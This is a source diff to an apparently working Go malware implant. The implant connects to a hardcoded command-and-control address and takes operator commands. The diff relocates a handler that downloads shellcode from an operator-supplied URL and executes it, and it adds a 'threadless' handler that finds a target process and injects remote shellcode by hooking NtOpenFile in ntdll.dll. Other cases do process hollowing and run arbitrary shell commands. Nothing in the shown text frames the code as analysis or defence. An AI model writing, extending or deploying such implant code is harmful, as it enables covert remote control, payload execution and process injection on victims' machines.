@@ -10,6 +10,7 @@ import (
 	"syscall"
 	"time"
 
+	"github.com/D3Ext/maldev/process"
 	"github.com/D3Ext/maldev/shellcode"
 )
 
@@ -142,7 +143,7 @@ func ls(conn *net.Conn, implantWD *string) {
 }
 
 func main() {
-	c2Address := "192.168.0.104:9999"
+	c2Address := "192.168.5.222:9000"
 	attempts := 0
 	implantWD, _ := os.Getwd()
 	fmt.Println("Implant Started")
@@ -171,36 +172,6 @@ func main() {
 				fmt.Println(output)
 				conn.Write([]byte("NoTime2Die\n"))
 			}
-		case "barCode\n":
-			{
-				buffer := make([]byte, 100)
-				conn.Write([]byte("OK\n"))
-				read_len, err := conn.Read(buffer)
-				if err != nil {
-					fmt.Println("Problem Reading the buffer")
-					conn.Write([]byte("Return"))
-					return
-				}
-				if read_len <= 1 {
-					fmt.Println("Problem with Buffer Size")
-					conn.Write([]byte("Return"))
-					return
-				}
-				bufferSnapped := buffer[:read_len]
-				remoteFileURL := string(bufferSnapped)
-				fmt.Println(remoteFileURL)
-				if remoteFileURL == "" {
-					fmt.Println("URL not recieved !")
-					conn.Write([]byte("Return"))
-				}
-				conn.Write([]byte("OK\n"))
-				sc, err := shellcode.GetShellcodeFromUrl(remoteFileURL)
-				if err != nil {
-					fmt.Println("Couldn't get shellcode")
-					return
-				}
-				barCodeLoad(&conn, &sc)
-			}
 		case "cd\n":
 			{
 				cd(&conn, &implantWD)
@@ -214,6 +185,36 @@ func main() {
 				fmt.Println(implantWD)
 				conn.Write([]byte(implantWD))
 			}
+		case "barCode\n":
+			{
+				buffer := make([]byte, 100)
+				conn.Write([]byte("OK\n"))
+				read_len, err := conn.Read(buffer)
+				if err != nil {
+					fmt.Println("Problem Reading the buffer")
+					conn.Write([]byte("Return"))
+					continue
+				}
+				if read_len <= 1 {
+					fmt.Println("Problem with Buffer Size")
+					conn.Write([]byte("Return"))
+					continue
+				}
+				bufferSnapped := buffer[:read_len]
+				remoteFileURL := string(bufferSnapped)
+				fmt.Println(remoteFileURL)
+				if remoteFileURL == "" {
+					fmt.Println("URL not recieved !")
+					conn.Write([]byte("Return"))
+				}
+				conn.Write([]byte("OK\n"))
+				sc, err := shellcode.GetShellcodeFromUrl(remoteFileURL)
+				if err != nil {
+					fmt.Println("Couldn't get shellcode")
+					continue
+				}
+				barCodeLoad(&conn, &sc)
+			}
 		case "hollow\n":
 			{
 				conn.Write([]byte("OK\n"))
@@ -223,12 +224,12 @@ func main() {
 				if err != nil {
 					fmt.Println("Problem Reading the buffer")
 					conn.Write([]byte("Return"))
-					return
+					continue
 				}
 				if read_len <= 1 {
 					fmt.Println("Problem with Buffer Size")
 					conn.Write([]byte("Return"))
-					return
+					continue
 				}
 				filePath := string(buffer[:read_len])
 				fmt.Println(filePath)
@@ -248,25 +249,25 @@ func main() {
 				if err != nil {
 					fmt.Println("Problem Reading the buffer")
 					conn.Write([]byte("Return"))
-					return
+					continue
 				}
 				if read_len <= 1 {
 					fmt.Println("Problem with Buffer Size")
 					conn.Write([]byte("Return"))
-					return
+					continue
 				}
 				bufferSnapped := buffer[:read_len]
 				remoteFileURL := string(bufferSnapped)
 				fmt.Println(remoteFileURL)
 				if remoteFileURL == "" {
 					fmt.Println("URL not recieved !")
-					conn.Write([]byte("Return"))
+					conn.Write([]byte("RETURN"))
 				}
 				conn.Write([]byte("OK\n"))
 				sc, err := shellcode.GetShellcodeFromUrl(remoteFileURL)
 				if err != nil {
 					fmt.Println("Couldn't get shellcode")
-					return
+					continue
 				}
 				//Hardcore method below
 				// //Create a buffer to recieve the shellcode and fire it
@@ -285,6 +286,72 @@ func main() {
 				// conn.Write([]byte("OK\n"))
 				// fmt.Println("Shellcode Recieved Commencing Hollowing")
 				hollow(&conn, sc, filePath)
+			}
+		case "threadless\n":
+			{
+				conn.Write([]byte("OK\n"))
+				buffer := make([]byte, 100)
+				read_len, err := conn.Read(buffer)
+				if read_len <= 1 {
+					fmt.Println("Error with size of buffer")
+					conn.Write([]byte("RETURN"))
+					continue
+				}
+				if err != nil {
+					fmt.Println("Error with buffer")
+					conn.Write([]byte("RETURN"))
+					continue
+				}
+				bufferSnapped := buffer[:read_len]
+				strBuffer := string(bufferSnapped)
+				fmt.Println(strBuffer)
+
+				pid, err := process.FindPidByName(strBuffer)
+				if err != nil {
+					fmt.Println("Couldn't find the process")
+					conn.Write([]byte("RETURN"))
+					continue
+				}
+				if len(pid) <= 0 {
+					fmt.Println("Couldn't find the process")
+					conn.Write([]byte("RETURN"))
+					continue
+				}
+				fmt.Println(pid)
+				targetPID := pid[0]
+				fmt.Println("Found target process")
+				conn.Write([]byte("OK\n"))
+
+				// Get the download URL of the remote file
+				read_len, err = conn.Read(buffer)
+				if err != nil {
+					fmt.Println("Problem Reading the buffer")
+					conn.Write([]byte("Return"))
+					continue
+				}
+				if read_len <= 1 {
+					fmt.Println("Problem with Buffer Size")
+					conn.Write([]byte("Return"))
+					continue
+				}
+				bufferSnapped = buffer[:read_len]
+				remoteFileURL := string(bufferSnapped)
+				fmt.Println(remoteFileURL)
+				if remoteFileURL == "" {
+					fmt.Println("URL not recieved !")
+					conn.Write([]byte("Return"))
+					continue
+				}
+				conn.Write([]byte("OK\n"))
+				sc, err := shellcode.GetShellcodeFromUrl(remoteFileURL)
+				if err != nil {
+					fmt.Println("Couldn't get shellcode")
+					continue
+				}
+				//Research a bit more about the functions and dll we can hit
+				function := "NtOpenFile"
+				dll := "ntdll.dll"
+				threadless(&conn, targetPID, function, dll, &sc)
 			}
 		default: //TO-DO: turning the default into an error statement and appending all shell commands with a ">.<" to avoid crashes
 			executeCommands(&conn, &command)
